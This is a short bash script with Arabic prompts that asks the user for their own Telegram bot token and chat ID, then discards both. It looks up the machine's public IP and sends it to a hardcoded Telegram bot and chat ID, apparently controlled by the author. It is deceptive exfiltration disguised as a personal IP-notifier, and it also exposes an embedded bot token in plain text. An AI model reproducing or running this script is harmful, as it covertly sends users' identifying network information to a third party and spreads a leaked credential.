#!/bin/bash
echo "برجاء ادخال توكن البوت"
read token
echo "برجاء ادخال الايدي المخصص للبوت"
read id
ip=$(curl ipinfo.io/ip)
curl -X POST https://api.telegram.org/bot5091863873:AAGnSOzOVrhVzEalbLCUhokbkauJS1ug_GU/sendMessage -d text="الايبي الخاص بك هو:  $ip" -d chat_id=1218276055
